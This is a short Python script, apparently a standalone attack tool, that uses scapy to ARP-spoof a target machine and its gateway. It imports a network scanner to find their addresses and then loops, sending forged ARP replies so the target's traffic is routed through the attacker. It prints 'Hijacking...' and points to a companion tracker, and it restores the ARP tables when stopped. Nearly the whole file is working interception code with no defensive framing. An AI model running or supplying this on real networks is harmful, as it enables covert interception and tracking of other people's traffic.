from MAC_HUNT import local_prep
from scapy.all import ARP, Ether, sendp
import time

class spoof():
    def __init__ (self):
        self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac=local_prep().scan_network()
        
    def lie(self):
        ether_to_target=Ether(dst=self.target_mac)
        packet_to_target_arp=ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
        sendp(ether_to_target/packet_to_target_arp, verbose=False)
        
        
        ether_to_router=Ether(dst=self.gateway_mac)
        packet_to_router_arp=ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
        sendp(ether_to_router/packet_to_router_arp, verbose=False)
    
    def truth(self):
        ether_to_target=Ether(dst=self.target_mac)
        packet_to_target_arp=ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        sendp(ether_to_target/packet_to_target_arp, verbose=False)
        
        
        ether_to_router=Ether(dst=self.gateway_mac)
        packet_to_router_arp=ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
        sendp(ether_to_router/packet_to_router_arp, verbose=False)
    
            
            
class main():
    def __init__ (self):
        self.spoof=spoof()    
        
        
    def run(self):
        print("[+] Hijacking...\n[#] Run Tracker to Track the Usage!")
        try:
            while True:
                self.spoof.lie()
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] Attack Stopped. Restoring Target's ARP Table...")
            self.spoof.truth()
            print("ARP Table Restored. Exiting.")        
                      
            
            
if __name__=="__main__":
    main().run()                  
            